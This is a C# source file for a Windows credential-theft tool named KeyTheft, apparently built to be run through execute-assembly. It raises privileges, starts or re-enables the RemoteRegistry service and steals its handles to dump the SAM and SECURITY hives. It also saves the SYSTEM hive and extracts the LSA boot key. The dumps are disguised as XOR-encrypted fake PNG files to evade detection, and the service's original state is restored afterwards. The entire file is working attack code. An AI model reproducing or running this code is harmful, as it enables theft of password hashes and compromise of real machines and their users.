using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

public static class KeyTheft
{
    const int StatusInfoLengthMismatch = unchecked((int)0xC0000004);
    const int StatusBufferTooSmall = unchecked((int)0xC0000023);
    const int SystemExtendedHandleInformation = 64;
    const int KeyNameInformation = 3;
    const uint ProcessDupHandle = 0x0040;
    const uint KeyRead = 0x20019;
    const uint GenericRead = 0x80000000;
    const uint GenericWrite = 0x40000000;
    const uint CreateAlways = 2;
    const uint FileAttributeNormal = 0x80;
    const uint DuplicateSameAccess = 2;
    const uint ScManagerConnect = 1;
    const uint ServiceQueryStatus = 4;
    const uint ServiceStart = 16;
    const uint ServiceQueryConfig = 1;
    const uint ServiceChangeConfig = 2;
    const uint ServiceStop = 1;
    const uint ServiceNoChange = 0xFFFFFFFF;
    const uint ServiceDemandStart = 3;
    const uint ServiceDisabledStart = 4;
    const int ServiceRunning = 4;
    const int ServiceStopped = 1;
    const int ErrorServiceDisabled = 1058;
    const int ErrorServiceAlreadyRunning = 1056;
    const int ErrorAccessDenied = 5;
    const uint TokenAdjustPrivileges = 0x20;
    const uint TokenQuery = 0x8;
    const int SePrivilegeEnabled = 0x2;

    static readonly IntPtr HkeyLocalMachine = (IntPtr)unchecked((int)0x80000002);
    static readonly IntPtr NtCurrentProcess = new IntPtr(-1);
    static readonly IntPtr InvalidHandleValue = new IntPtr(-1);

    static readonly byte[] PngSig = { 0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A };
    static readonly int[] BootKeyPerm = { 8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7 };
    static readonly string[] BootKeyNames = { "JD", "Skew1", "GBG", "Data" };

    static readonly List<string> Ledger = new List<string>();
    static bool Quiet;

    [StructLayout(LayoutKind.Sequential)]
    struct HandleEntry
    {
        public IntPtr Object;
        public UIntPtr UniqueProcessId;
        public IntPtr HandleValue;
        public uint GrantedAccess;
        public ushort CreatorBackTraceIndex;
        public ushort ObjectTypeIndex;
        public uint HandleAttributes;
        public uint Reserved;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct Luid
    {
        public uint LowPart;
        public int HighPart;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct TokenPrivileges
    {
        public int PrivilegeCount;
        public Luid Luid;
        public int Attributes;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct ServiceStatus
    {
        public uint ServiceType;
        public uint CurrentState;
        public uint ControlsAccepted;
        public uint Win32ExitCode;
        public uint ServiceSpecificExitCode;
        public uint CheckPoint;
        public uint WaitHint;
    }

    class ServiceState
    {
        public IntPtr Scm = IntPtr.Zero;
        public IntPtr Svc = IntPtr.Zero;
        public uint Pid;
        public uint OrigStart;
        public bool Reconfigured;
        public bool StartedByUs;
    }

    [DllImport("ntdll.dll")]
    static extern int NtQuerySystemInformation(int cls, IntPtr info, int len, out int retLen);

    [DllImport("ntdll.dll")]
    static extern int NtDuplicateObject(IntPtr srcProc, IntPtr srcHandle, IntPtr dstProc, out IntPtr dstHandle, uint access, uint attrs, uint options);

    [DllImport("ntdll.dll")]
    static extern int NtQueryKey(IntPtr key, int cls, IntPtr buf, int len, out int retLen);

    [DllImport("ntdll.dll")]
    static extern int NtSaveKey(IntPtr key, IntPtr file);

    [DllImport("ntdll.dll")]
    static extern int NtClose(IntPtr handle);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(uint access, bool inherit, uint pid);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr handle);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern IntPtr CreateFileW(string name, uint access, uint share, IntPtr security, uint disposition, uint flags, IntPtr template);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool OpenProcessToken(IntPtr process, uint access, out IntPtr token);

    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern bool LookupPrivilegeValueW(string system, string name, out Luid luid);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool AdjustTokenPrivileges(IntPtr token, bool disableAll, ref TokenPrivileges newState, int len, IntPtr prev, IntPtr ret);

    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern int RegConnectRegistryW(string machine, IntPtr hkey, out IntPtr result);

    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern int RegOpenKeyExW(IntPtr key, string subKey, uint options, uint sam, out IntPtr result);

    [DllImport("advapi32.dll")]
    static extern int RegCloseKey(IntPtr key);

    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern int RegQueryInfoKeyW(IntPtr key, StringBuilder cls, ref int clsLen, IntPtr reserved, IntPtr subKeys, IntPtr maxSubKeyLen, IntPtr maxClassLen, IntPtr values, IntPtr maxValueNameLen, IntPtr maxValueLen, IntPtr secDesc, IntPtr lastWrite);

    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern IntPtr OpenSCManagerW(string machine, string db, uint access);

    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern IntPtr OpenServiceW(IntPtr scm, string name, uint access);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool QueryServiceStatusEx(IntPtr svc, int info, byte[] buf, int bufLen, out int needed);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool QueryServiceConfigW(IntPtr svc, IntPtr buf, int bufLen, out int needed);

    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern bool ChangeServiceConfigW(IntPtr svc, uint type, uint start, uint error, string binaryPath, string loadGroup, IntPtr tag, string deps, string account, string password, string display);

    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern bool StartServiceW(IntPtr svc, int argc, IntPtr argv);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool ControlService(IntPtr svc, int code, ref ServiceStatus status);

    [DllImport("advapi32.dll")]
    static extern bool CloseServiceHandle(IntPtr handle);

    static void Log(string s)
    {
        if (!Quiet) Console.WriteLine(s);
    }

    static void Art(string s)
    {
        Ledger.Add(s);
        if (!Quiet) Console.WriteLine("[artifact] " + s);
    }

    static string ToHex(byte[] b)
    {
        var sb = new StringBuilder(b.Length * 2);
        foreach (byte x in b) sb.Append(x.ToString("x2"));
        return sb.ToString();
    }

    static bool EnablePriv(string name)
    {
        IntPtr token;
        if (!OpenProcessToken(GetCurrentProcess(), TokenAdjustPrivileges | TokenQuery, out token))
            return false;
        Luid luid;
        if (!LookupPrivilegeValueW(null, name, out luid))
        {
            CloseHandle(token);
            return false;
        }
        var tp = new TokenPrivileges();
        tp.PrivilegeCount = 1;
        tp.Luid = luid;
        tp.Attributes = SePrivilegeEnabled;
        bool ok = AdjustTokenPrivileges(token, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero) && Marshal.GetLastWin32Error() == 0;
        CloseHandle(token);
        return ok;
    }

    static IntPtr QueryHandleTable()
    {
        int len = 0x400000;
        while (true)
        {
            IntPtr buf = Marshal.AllocHGlobal(len);
            int ret;
            int st = NtQuerySystemInformation(SystemExtendedHandleInformation, buf, len, out ret);
            if (st == 0)
                return buf;
            Marshal.FreeHGlobal(buf);
            if (st != StatusInfoLengthMismatch || len >= 0x40000000)
                return IntPtr.Zero;
            len *= 2;
        }
    }

    static ushort DetectKeyTypeIndex()
    {
        IntPtr hk;
        if (RegOpenKeyExW(HkeyLocalMachine, "SOFTWARE", 0, KeyRead, out hk) != 0)
            return 0;
        ushort idx = 0;
        IntPtr info = QueryHandleTable();
        if (info != IntPtr.Zero)
        {
            long count = Marshal.ReadIntPtr(info).ToInt64();
            int esz = Marshal.SizeOf(typeof(HandleEntry));
            int myPid = Process.GetCurrentProcess().Id;
            for (long i = 0; i < count; i++)
            {
                var e = (HandleEntry)Marshal.PtrToStructure(new IntPtr(info.ToInt64() + 16 + i * esz), typeof(HandleEntry));
                if ((long)e.UniqueProcessId == myPid && e.HandleValue == hk)
                {
                    idx = e.ObjectTypeIndex;
                    break;
                }
            }
            Marshal.FreeHGlobal(info);
        }
        RegCloseKey(hk);
        return idx;
    }

    static bool StealAndSave(uint pid, ushort typeIdx, string keyPath, string outFile)
    {
        IntPtr hProc = OpenProcess(ProcessDupHandle, false, pid);
        if (hProc == IntPtr.Zero)
        {
            Log("  [-] OpenProcess failed: " + Marshal.GetLastWin32Error());
            return false;
        }
        IntPtr info = QueryHandleTable();
        if (info == IntPtr.Zero)
        {
            Log("  [-] handle table query failed");
            CloseHandle(hProc);
            return false;
        }
        IntPtr hFile = CreateFileW(outFile, GenericWrite, 0, IntPtr.Zero, CreateAlways, FileAttributeNormal, IntPtr.Zero);
        if (hFile == InvalidHandleValue)
        {
            Log("  [-] CreateFile failed: " + Marshal.GetLastWin32Error());
            Marshal.FreeHGlobal(info);
            CloseHandle(hProc);
            return false;
        }
        bool found = false;
        long count = Marshal.ReadIntPtr(info).ToInt64();
        int esz = Marshal.SizeOf(typeof(HandleEntry));
        for (long i = 0; i < count && !found; i++)
        {
            var e = (HandleEntry)Marshal.PtrToStructure(new IntPtr(info.ToInt64() + 16 + i * esz), typeof(HandleEntry));
            if ((long)e.UniqueProcessId != (long)pid)
                continue;
            if (e.ObjectTypeIndex != typeIdx)
                continue;
            if ((e.GrantedAccess & (KeyRead | GenericRead)) == 0)
                continue;
            IntPtr dup;
            if (NtDuplicateObject(hProc, e.HandleValue, NtCurrentProcess, out dup, 0, 0, DuplicateSameAccess) != 0 || dup == IntPtr.Zero)
                continue;
            int need;
            int st = NtQueryKey(dup, KeyNameInformation, IntPtr.Zero, 0, out need);
            if (st != StatusBufferTooSmall || need <= 0)
            {
                NtClose(dup);
                continue;
            }
            IntPtr nb = Marshal.AllocHGlobal(need);
            st = NtQueryKey(dup, KeyNameInformation, nb, need, out need);
            if (st == 0)
            {
                uint nameLen = (uint)Marshal.ReadInt32(nb, 0);
                if (nameLen == 0 || nameLen > 0x2000)
                {
                    Log("  [!] bad NameLength " + nameLen + " need=" + need + " buf=" + nb.ToInt64().ToString("X"));
                    Marshal.FreeHGlobal(nb);
                    NtClose(dup);
                    continue;
                }
                string name = Marshal.PtrToStringUni(new IntPtr(nb.ToInt64() + 4), (int)(nameLen / 2));
                if (string.Equals(name, keyPath, StringComparison.OrdinalIgnoreCase))
                {
                    Log("  [+] FOUND " + keyPath + " handle 0x" + e.HandleValue.ToInt64().ToString("X") + " access 0x" + e.GrantedAccess.ToString("X8"));
                    st = NtSaveKey(dup, hFile);
                    if (st == 0)
                        found = true;
                    else
                        Log("  [!] NtSaveKey 0x" + st.ToString("X8") + " trying next handle");
                }
            }
            Marshal.FreeHGlobal(nb);
            NtClose(dup);
        }
        CloseHandle(hFile);
        Marshal.FreeHGlobal(info);
        CloseHandle(hProc);
        if (!found)
        {
            try { File.Delete(outFile); } catch { }
            Log("  [-] " + keyPath + " handle not found");
        }
        return found;
    }

    static bool SaveSystem(string outFile)
    {
        IntPtr hk;
        if (RegOpenKeyExW(HkeyLocalMachine, "SYSTEM", 0, KeyRead, out hk) != 0)
        {
            Log("  [-] SYSTEM open failed: " + Marshal.GetLastWin32Error());
            return false;
        }
        IntPtr hFile = CreateFileW(outFile, GenericWrite, 0, IntPtr.Zero, CreateAlways, FileAttributeNormal, IntPtr.Zero);
        if (hFile == InvalidHandleValue)
        {
            Log("  [-] CreateFile failed: " + Marshal.GetLastWin32Error());
            RegCloseKey(hk);
            return false;
        }
        int st = NtSaveKey(hk, hFile);
        CloseHandle(hFile);
        RegCloseKey(hk);
        if (st != 0)
        {
            Log("  [-] NtSaveKey 0x" + st.ToString("X8"));
            try { File.Delete(outFile); } catch { }
            return false;
        }
        return true;
    }

    static ServiceState AcquireService(string name)
    {
        var s = new ServiceState();
        s.Scm = OpenSCManagerW(null, null, ScManagerConnect);
        if (s.Scm == IntPtr.Zero)
            return s;
        s.Svc = OpenServiceW(s.Scm, name, ServiceQueryStatus | ServiceStart | ServiceQueryConfig | ServiceChangeConfig);
        if (s.Svc == IntPtr.Zero)
        {
            CloseServiceHandle(s.Scm);
            s.Scm = IntPtr.Zero;
            return s;
        }
        IntPtr cfg = Marshal.AllocHGlobal(4096);
        int cfgNeed;
        if (QueryServiceConfigW(s.Svc, cfg, 4096, out cfgNeed))
            s.OrigStart = (uint)Marshal.ReadInt32(cfg, 4);
        Marshal.FreeHGlobal(cfg);

        var ssp = new byte[36];
        int need;
        if (!QueryServiceStatusEx(s.Svc, 0, ssp, ssp.Length, out need))
        {
            CloseServiceHandle(s.Svc);
            CloseServiceHandle(s.Scm);
            s.Svc = IntPtr.Zero;
            s.Scm = IntPtr.Zero;
            return s;
        }
        if (BitConverter.ToUInt32(ssp, 4) != ServiceRunning)
        {
            if (!StartServiceW(s.Svc, 0, IntPtr.Zero))
            {
                int err = Marshal.GetLastWin32Error();
                if (err == ErrorServiceDisabled)
                {
                    if (!ChangeServiceConfigW(s.Svc, ServiceNoChange, ServiceDemandStart, ServiceNoChange, null, null, IntPtr.Zero, null, null, null, null))
                    {
                        Log("  [-] ChangeServiceConfig failed: " + Marshal.GetLastWin32Error());
                        CloseServiceHandle(s.Svc);
                        CloseServiceHandle(s.Scm);
                        s.Svc = IntPtr.Zero;
                        s.Scm = IntPtr.Zero;
                        return s;
                    }
                    s.Reconfigured = true;
                    if (!StartServiceW(s.Svc, 0, IntPtr.Zero))
                    {
                        Log("  [-] StartService failed: " + Marshal.GetLastWin32Error());
                        CloseServiceHandle(s.Svc);
                        CloseServiceHandle(s.Scm);
                        s.Svc = IntPtr.Zero;
                        s.Scm = IntPtr.Zero;
                        return s;
                    }
                    s.StartedByUs = true;
                }
                else if (err != ErrorServiceAlreadyRunning)
                {
                    Log("  [-] StartService failed: " + err);
                    CloseServiceHandle(s.Svc);
                    CloseServiceHandle(s.Scm);
                    s.Svc = IntPtr.Zero;
                    s.Scm = IntPtr.Zero;
                    return s;
                }
            }
            else
            {
                s.StartedByUs = true;
            }
            for (int t = 0; t < 20; t++)
            {
                Thread.Sleep(250);
                if (!QueryServiceStatusEx(s.Svc, 0, ssp, ssp.Length, out need))
                    break;
                if (BitConverter.ToUInt32(ssp, 4) == ServiceRunning)
                    break;
            }
            if (BitConverter.ToUInt32(ssp, 4) != ServiceRunning)
            {
                CloseServiceHandle(s.Svc);
                CloseServiceHandle(s.Scm);
                s.Svc = IntPtr.Zero;
                s.Scm = IntPtr.Zero;
                return s;
            }
        }
        s.Pid = BitConverter.ToUInt32(ssp, 28);
        return s;
    }

    static void ReleaseService(ServiceState s, string name)
    {
        if (s.Svc == IntPtr.Zero)
            return;
        if (s.StartedByUs)
        {
            var ss = new ServiceStatus();
            if (!ControlService(s.Svc, 1, ref ss) && Marshal.GetLastWin32Error() == ErrorAccessDenied)
            {
                try
                {
                    var psi = new ProcessStartInfo("sc.exe", "stop " + name)
                    {
                        CreateNoWindow = true,
                        UseShellExecute = false
                    };
                    Process p = Process.Start(psi);
                    if (p != null)
                        p.WaitForExit(10000);
                }
                catch { }
            }
            var ssp = new byte[36];
            int need;
            bool stopped = false;
            for (int t = 0; t < 20; t++)
            {
                Thread.Sleep(250);
                if (!QueryServiceStatusEx(s.Svc, 0, ssp, ssp.Length, out need))
                    break;
                if (BitConverter.ToUInt32(ssp, 4) == ServiceStopped)
                {
                    stopped = true;
                    break;
                }
            }
            if (!stopped)
                Log("  [!] service not fully stopped after restore");
        }
        if (s.Reconfigured && s.OrigStart != ServiceDemandStart && s.OrigStart != 0)
            ChangeServiceConfigW(s.Svc, ServiceNoChange, s.OrigStart, ServiceNoChange, null, null, IntPtr.Zero, null, null, null, null);
        CloseServiceHandle(s.Svc);
        if (s.Scm != IntPtr.Zero)
            CloseServiceHandle(s.Scm);
        s.Svc = IntPtr.Zero;
        s.Scm = IntPtr.Zero;
    }

    static string BootKey()
    {
        string hex = "";
        foreach (string n in BootKeyNames)
        {
            IntPtr hk;
            if (RegOpenKeyExW(HkeyLocalMachine, "SYSTEM\\CurrentControlSet\\Control\\Lsa\\" + n, 0, KeyRead, out hk) != 0)
                return null;
            var cls = new StringBuilder(64);
            int len = 64;
            int r = RegQueryInfoKeyW(hk, cls, ref len, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            RegCloseKey(hk);
            if (r != 0)
                return null;
            hex += cls.ToString(0, len);
        }
        if (hex.Length != 32)
            return null;
        byte[] scrambled = new byte[16];
        for (int i = 0; i < 16; i++)
            scrambled[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
        byte[] bk = new byte[16];
        for (int i = 0; i < 16; i++)
            bk[i] = scrambled[BootKeyPerm[i]];
        return ToHex(bk);
    }

    static uint Crc32(byte[] d, int off, int len)
    {
        uint c = 0xFFFFFFFFu;
        for (int i = off; i < off + len; i++)
        {
            c ^= d[i];
            for (int k = 0; k < 8; k++)
                c = ((c & 1) != 0) ? (c >> 1) ^ 0xEDB88320u : c >> 1;
        }
        return ~c;
    }

    static byte[] BuildIhdr()
    {
        byte[] b = new byte[25];
        b[3] = 13;
        b[4] = (byte)'I';
        b[5] = (byte)'H';
        b[6] = (byte)'D';
        b[7] = (byte)'R';
        b[11] = 1;
        b[15] = 1;
        b[16] = 8;
        b[17] = 6;
        uint crc = Crc32(b, 4, 17);
        b[21] = (byte)(crc >> 24);
        b[22] = (byte)(crc >> 16);
        b[23] = (byte)(crc >> 8);
        b[24] = (byte)crc;
        return b;
    }

    static string PackPng(string src, string dst, bool deleteSrc)
    {
        byte[] data = File.ReadAllBytes(src);
        byte[] key = new byte[16];
        using (var rng = RandomNumberGenerator.Create())
            rng.GetBytes(key);
        for (int i = 0; i < data.Length; i++)
            data[i] ^= key[i % 16];
        using (Stream fs = File.Create(dst))
        {
            byte[] ihdr = BuildIhdr();
            fs.Write(PngSig, 0, 8);
            fs.Write(ihdr, 0, ihdr.Length);
            fs.Write(data, 0, data.Length);
        }
        if (deleteSrc)
            File.Delete(src);
        return ToHex(key);
    }

    static void Usage()
    {
        Console.Error.WriteLine("KeyTheft C# module (execute-assembly / standalone)");
        Console.Error.WriteLine("  KeyTheft [--sam <path>] [--system <path>] [--security <path>] [--pack png|none] [--keep-temp] [--quiet]");
        Console.Error.WriteLine("  exit 0 = both hives, 2 = partial, 1 = failure, 3 = bad args");
    }

    public static int Main(string[] args)
    {
        try
        {
            return Run(args);
        }
        catch (Exception ex)
        {
            Console.Error.WriteLine(ex.ToString());
            return 1;
        }
    }

    static int Run(string[] args)
    {
        string samOut = "sam.png";
        string sysOut = "system.png";
        string secOut = "security.png";
        bool secWanted = false;
        bool pack = true;
        bool keepTemp = false;
        for (int i = 0; i < args.Length; i++)
        {
            string a = args[i];
            if (a == "--sam" && i + 1 < args.Length)
                samOut = args[++i];
            else if (a == "--system" && i + 1 < args.Length)
                sysOut = args[++i];
            else if (a == "--security" && i + 1 < args.Length)
            {
                secOut = args[++i];
                secWanted = true;
            }
            else if (a == "--pack" && i + 1 < args.Length && args[i + 1] == "none")
            {
                pack = false;
                i++;
            }
            else if (a == "--pack" && i + 1 < args.Length && args[i + 1] == "png")
            {
                pack = true;
                i++;
            }
            else if (a == "--keep-temp")
                keepTemp = true;
            else if (a == "--quiet")
                Quiet = true;
            else
            {
                Usage();
                return 3;
            }
        }

        if (!EnablePriv("SeDebugPrivilege") || !EnablePriv("SeBackupPrivilege"))
        {
            Console.Error.WriteLine("[-] privilege enable failed (run elevated)");
            return 1;
        }
        ushort typeIdx = DetectKeyTypeIndex();
        if (typeIdx == 0)
        {
            Console.Error.WriteLine("[-] key type index detection failed");
            return 1;
        }
        Log("[+] key type index " + typeIdx);

        string samTmp = samOut + ".tmp";
        string sysTmp = sysOut + ".tmp";
        string secTmp = secOut + ".tmp";
        bool samOk = false;
        bool sysOk = false;
        bool secOk = false;

        ServiceState svc = AcquireService("RemoteRegistry");
        if (svc.Pid != 0)
        {
            Log("[+] RemoteRegistry pid " + svc.Pid);
            IntPtr hRemote;
            if (RegConnectRegistryW("\\\\localhost", HkeyLocalMachine, out hRemote) == 0)
            {
                IntPtr hSam;
                if (RegOpenKeyExW(hRemote, "SAM", 0, KeyRead, out hSam) == 0)
                {
                    samOk = StealAndSave(svc.Pid, typeIdx, "\\REGISTRY\\MACHINE\\SAM", samTmp);
                    RegCloseKey(hSam);
                    if (samOk)
                        Art("wrote " + samTmp);
                }
                else
                {
                    Log("  [-] remote SAM open failed");
                }
                if (secWanted)
                {
                    IntPtr hSec;
                    if (RegOpenKeyExW(hRemote, "SECURITY", 4, KeyRead, out hSec) == 0)
                    {
                        secOk = StealAndSave(svc.Pid, typeIdx, "\\REGISTRY\\MACHINE\\SECURITY", secTmp);
                        RegCloseKey(hSec);
                        if (secOk)
                            Art("wrote " + secTmp);
                    }
                    else
                    {
                        Log("  [-] remote SECURITY open failed: " + Marshal.GetLastWin32Error());
                    }
                }
                RegCloseKey(hRemote);
            }
            else
            {
                Log("  [-] RegConnectRegistryW failed");
            }
            ReleaseService(svc, "RemoteRegistry");
            Art("RemoteRegistry " + (svc.Reconfigured ? "start type re-enabled then restored" : "left as found"));
        }
        else
        {
            Log("  [-] RemoteRegistry unavailable");
        }

        Log("[*] SYSTEM hive");
        sysOk = SaveSystem(sysTmp);
        if (sysOk)
            Art("wrote " + sysTmp);

        string samKey = null;
        string sysKey = null;
        if (samOk)
        {
            if (pack)
            {
                samKey = PackPng(samTmp, samOut, !keepTemp);
                Art("packed " + samOut + " key in operator output");
            }
            else
            {
                File.Copy(samTmp, samOut, true);
                File.Delete(samTmp);
            }
        }
        if (sysOk)
        {
            if (pack)
            {
                sysKey = PackPng(sysTmp, sysOut, !keepTemp);
                Art("packed " + sysOut + " key in operator output");
            }
            else
            {
                File.Copy(sysTmp, sysOut, true);
                File.Delete(sysTmp);
            }
        }
        string secKey = null;
        if (secWanted && secOk)
        {
            if (pack)
            {
                secKey = PackPng(secTmp, secOut, !keepTemp);
                Art("packed " + secOut + " key in operator output");
            }
            else
            {
                File.Copy(secTmp, secOut, true);
                File.Delete(secTmp);
            }
        }
        if (!keepTemp)
        {
            if (File.Exists(samTmp) && samTmp != samOut)
                File.Delete(samTmp);
            if (File.Exists(sysTmp) && sysTmp != sysOut)
                File.Delete(sysTmp);
            if (File.Exists(secTmp) && secTmp != secOut)
                File.Delete(secTmp);
        }

        string bk = BootKey();
        if (bk != null)
            Log("[+] boot key " + bk);

        Console.WriteLine("");
        Console.WriteLine("SAM:    " + (samOk ? "SUCCESS" : "FAILED"));
        Console.WriteLine("SYSTEM: " + (sysOk ? "SUCCESS" : "FAILED"));
        if (secWanted)
            Console.WriteLine("SECURITY: " + (secOk ? "SUCCESS" : "FAILED"));
        if (pack && samKey != null)
            Console.WriteLine("sam key: " + samKey);
        if (pack && sysKey != null)
            Console.WriteLine("system key: " + sysKey);
        if (pack && secWanted && secKey != null)
            Console.WriteLine("security key: " + secKey);
        Log("");
        Log("decode with decode.py <keyhex> <file>");
        foreach (string a in Ledger)
            Log("[ledger] " + a);
        bool allOk = samOk && sysOk && (!secWanted || secOk);
        bool anyOk = samOk || sysOk || (secWanted && secOk);
        return allOk ? 0 : (anyOk ? 2 : 1);
    }
}
